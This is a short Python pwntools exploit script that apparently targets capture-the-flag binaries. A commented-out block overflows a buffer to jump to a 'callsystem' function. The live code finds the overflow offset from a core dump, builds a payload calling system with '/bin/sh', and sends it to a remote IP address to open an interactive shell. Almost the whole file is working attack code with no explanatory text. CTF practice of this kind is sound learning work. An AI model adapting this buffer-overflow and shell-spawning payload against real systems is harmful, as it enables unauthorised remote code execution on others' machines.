#!/usr/bin/python3
'''
from pwn import *

p = process('./chall2')
#p = remote('sharkyctf.xyz', 20333)

binary = ELF('./chall2')
win = binary.symbols['callsystem']

payload  = (128+4) * b'A'
payload += p64(win)

p.sendline(payload)
p.interactive()

##best so far i have seen 
'''
from pwn import *

p = process('./rop')

#p.recvuntil('What\'s your name?')
p.sendline(cyclic(1024))
p.wait()
core = p.corefile
p.close()
os.remove(core.file.name)
padding = cyclic_find(core.read(core.esp,4))

binary = ELF('./rop')
win = binary.symbols['system']
print("syscall:", win)
print("paddiing:",padding)
sh = next(binary.search(b'/bin/sh'))
print('bash:', sh)
payload  = 140 * b'a'
payload  += p32(win)
# payload  += b'ls;ls;ls'
payload += p32(sh)*2
print(payload)
# p = remote("220.249.52.133",51667)
p = remote('220.249.52.133',57562)
# p = process('./rop')
# p.recvuntil('What\'s your name?')
p.sendline(payload)
p.interactive()



